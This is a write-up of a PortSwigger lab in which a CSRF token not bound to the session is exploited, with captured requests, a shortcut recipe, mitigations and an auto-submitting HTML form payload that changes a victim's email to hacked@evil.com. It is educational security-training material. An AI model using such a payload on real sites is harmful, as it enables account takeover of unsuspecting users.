# CSRF where token is not tied to user session

**Source:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)  
**Category:** CSRF  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

## Vulnerability
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
- `wiener:peter`
- `carlos:montoya`

## Exploitation

### Steps
1. Access the lab, log in and intercept the email change request to `test@example.com`.

   **Fun fact** - I pressed Enter too fast and sent `test@example` (without the TLD), and the email was still changed.

2. In the request we see the session cookie and csrf token:

   ```
   POST /my-account/change-email HTTP/2
   Host: 0a5b007903296503800626b5008e004d.web-security-academy.net
   Cookie: session=3SGT7BVXP39Ohqx0H3eYdcDodsGLLKdE
   [...]
   email=test%40example.com&csrf=inxmUSKflqGS6CiXeqB0u5940WVoo52E
   ```

   Save these values.

   After sending it to Repeater and resending, we get `Invalid CSRF token`. Removing `csrf=` entirely also does not work.

3. In another browser window (incognito, another browser) we log in to the second account `carlos:montoya` and do the same to email `test2@example.com`. We swap Carlos's CSRF token for Wiener's and send. We get logged out, but the response is `HTTP/2 302 Found`. After returning to the window with the `wiener` account, our email was changed to `test2@example.com`.

4. Go to the exploit server, paste the code below and send it, adding Carlos's csrf as the csrf value.

   ```html
   <html>
       <body>
           <form action="https://0a5b007903296503800626b5008e004d.web-security-academy.net/my-account/change-email" method="POST">
               <input type="hidden" name="email" value="hacked@evil.com" />
               <input type="hidden" name="csrf" value="MJIhrys4fwYjeuctqqiUgBOLlbaGSwYK" />
           </form>
           <script> document.forms[0].submit(); </script>
       </body>
   </html>
   ```

   Lab solved.

### Payload

```html
<html>
    <body>
        <form action="https://0a5b007903296503800626b5008e004d.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="hacked@evil.com" />
            <input type="hidden" name="csrf" value="MJIhrys4fwYjeuctqqiUgBOLlbaGSwYK" />
        </form>
        <script> document.forms[0].submit(); </script>
    </body>
</html>
```

### Shortcut
1. Log in as any user and grab a valid CSRF token.
2. Build a form POST with the victim email and your CSRF token.
3. Host it on the exploit server and deliver to victim.

## Impact
An attacker can change the victim's email address without knowing their CSRF token. Because the token is not bound to the session, any valid token (even from the attacker's own account) is accepted. This enables account takeover via password reset sent to an attacker-controlled address.

## Mitigation
CSRF tokens must be tied to the user session. The server should verify that the submitted token belongs to the same session that sent the request. Tokens should also be single-use where possible, and standard defenses (SameSite cookies, Origin/Referer checks) should be applied.

## Tools
- Burp Suite
- Repeater
- Intruder

## Notes
- Token is required but not bound to the session - a token from the attacker's account works in the victim's session.
- Resending the same request returns `Invalid CSRF token` - the token is single-use, so a fresh one is needed in the exploit.
- Removing `csrf=` does not work - the token is required, but any valid token is accepted.
- Key test: Carlos's session + Wiener's token → 302 Found = vulnerability confirmed.
- Root cause: no binding between the CSRF token and the user session.